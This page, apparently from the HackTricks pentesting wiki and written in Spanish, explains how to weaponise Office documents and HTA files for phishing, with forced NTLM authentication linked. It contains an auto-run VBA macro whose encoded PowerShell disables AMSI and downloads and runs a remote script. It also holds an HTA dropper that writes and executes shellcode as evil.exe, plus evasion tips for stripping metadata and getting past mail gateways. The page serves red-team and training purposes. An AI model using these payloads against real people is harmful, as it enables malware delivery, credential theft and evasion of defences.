## Archivos y Documentos de Phishing

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Documentos de Office

Microsoft Word realiza una validación de datos del archivo antes de abrirlo. La validación de datos se realiza en forma de identificación de estructura de datos, según el estándar OfficeOpenXML. Si ocurre algún error durante la identificación de la estructura de datos, el archivo que se está analizando no se abrirá.

Por lo general, los archivos de Word que contienen macros usan la extensión `.docm`. Sin embargo, es posible cambiar el nombre del archivo cambiando la extensión del archivo y aún así mantener su capacidad de ejecución de macros.\
Por ejemplo, un archivo RTF no admite macros, por diseño, pero un archivo DOCM renombrado a RTF será manejado por Microsoft Word y será capaz de ejecutar macros.\
Los mismos mecanismos internos se aplican a todo el software de la suite de Microsoft Office (Excel, PowerPoint, etc.).

Puede utilizar el siguiente comando para comprobar qué extensiones van a ser ejecutadas por algunos programas de Office:
```bash
assoc | findstr /i "word excel powerp"
```
Los archivos DOCX que hacen referencia a una plantilla remota (Archivo - Opciones - Complementos - Administrar: Plantillas - Ir) que incluye macros también pueden "ejecutar" macros.

### Carga de imagen externa

Ir a: _Insertar --> Partes rápidas --> Campo_\
_**Categorías**: Vínculos y referencias, **Nombres de campo**: includePicture, y **Nombre de archivo o URL**:_ http://\<ip>/lo-que-sea

![](<../../.gitbook/assets/image (316).png>)

### Puerta trasera de macros

Es posible utilizar macros para ejecutar código arbitrario desde el documento.

#### Funciones de carga automática

Cuanto más comunes sean, más probable es que el AV las detecte.

* AutoOpen()
* Document\_Open()

#### Ejemplos de código de macros
```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Eliminar manualmente los metadatos

Ve a **Archivo > Información > Inspeccionar documento > Inspeccionar documento**, lo que abrirá el Inspector de documentos. Haz clic en **Inspeccionar** y luego en **Eliminar todo** junto a **Propiedades del documento e información personal**.

#### Extensión de documento

Cuando hayas terminado, selecciona el menú desplegable **Guardar como tipo**, cambia el formato de **`.docx`** a **Word 97-2003 `.doc`**.\
Haz esto porque **no puedes guardar macros dentro de un `.docx`** y hay un **estigma** alrededor de la extensión macro habilitada **`.docm`** (por ejemplo, el icono en miniatura tiene un enorme `!` y algunos gateways web/correo electrónico los bloquean por completo). Por lo tanto, esta **extensión de legado `.doc` es el mejor compromiso**.

#### Generadores de macros maliciosos

* MacOS
  * [**macphish**](https://github.com/cldrn/macphish)
  * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Archivos HTA

Un HTA es un programa propietario de Windows cuyo **código fuente consiste en HTML y uno o más lenguajes de script** compatibles con Internet Explorer (VBScript y JScript). HTML se utiliza para generar la interfaz de usuario y el lenguaje de script para la lógica del programa. Un **HTA se ejecuta sin las limitaciones del modelo de seguridad del navegador**, por lo que se ejecuta como una aplicación "totalmente confiable".

Un HTA se ejecuta utilizando **`mshta.exe`**, que normalmente está **instalado** junto con **Internet Explorer**, lo que hace que **`mshta` dependa de IE**. Por lo tanto, si se ha desinstalado, los HTA no podrán ejecutarse.
```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
	Function var_func()
		var_shellcode = "<shellcode>"

		Dim var_obj
		Set var_obj = CreateObject("Scripting.FileSystemObject")
		Dim var_stream
		Dim var_tempdir
		Dim var_tempexe
		Dim var_basedir
		Set var_tempdir = var_obj.GetSpecialFolder(2)
		var_basedir = var_tempdir & "\" & var_obj.GetTempName()
		var_obj.CreateFolder(var_basedir)
		var_tempexe = var_basedir & "\" & "evil.exe"
		Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
		For i = 1 to Len(var_shellcode) Step 2
		    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
		Next
		var_stream.Close
		Dim var_shell
		Set var_shell = CreateObject("Wscript.Shell")
		var_shell.run var_tempexe, 0, true
		var_obj.DeleteFile(var_tempexe)
		var_obj.DeleteFolder(var_basedir)
	End Function

	var_func
	self.close
</script>
```
## Forzando la autenticación NTLM

Existen varias formas de **forzar la autenticación NTLM "remotamente"**, por ejemplo, se pueden agregar **imágenes invisibles** a correos electrónicos o HTML a los que el usuario accederá (¿incluso HTTP MitM?). O enviar a la víctima la **dirección de archivos** que **dispararán** una **autenticación** solo por **abrir la carpeta**.

**Revise estas ideas y más en las siguientes páginas:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### Relevamiento NTLM

No olvide que no solo puede robar el hash o la autenticación, sino también **realizar ataques de relevamiento NTLM**:

* [**Ataques de relevamiento NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (relevamiento NTLM a certificados)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenga el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparta sus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
